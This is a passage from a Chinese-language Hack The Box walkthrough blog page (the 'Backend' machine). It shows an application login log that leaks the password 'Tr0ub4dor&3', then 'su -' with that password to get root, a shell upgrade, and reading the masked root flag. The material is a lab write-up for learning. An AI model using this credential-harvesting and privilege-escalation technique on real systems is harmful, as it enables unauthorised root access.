class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:15:05 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:23:25 - Login Failure <span class="keyword">for</span> Tr0ub4dor&amp;3</span><br><span class="line">08/27/2022, 14:25:00 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:25:05 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:25:25 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:26:45 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:31:45 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:38:25 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 15:51:09 - Login Success <span class="keyword">for</span> crazy@inside.htb</span><br><span class="line">08/27/2022, 16:14:53 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 16:18:59 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">htb@Backend:~/uhc$ </span><br></pre></td></tr></table></figure>
+
+<p>其中的Tr0ub4dor&amp;3不像是一个用户名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">htb@Backend:~/uhc$ su -</span><br><span class="line">su -</span><br><span class="line">Password: Tr0ub4dor&amp;3</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">root@Backend:~<span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">e08................................</span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Backend</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Backend.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-BackendTwo.html" title="HTB Walkthrough - BackendTwo">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - BackendTwo</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
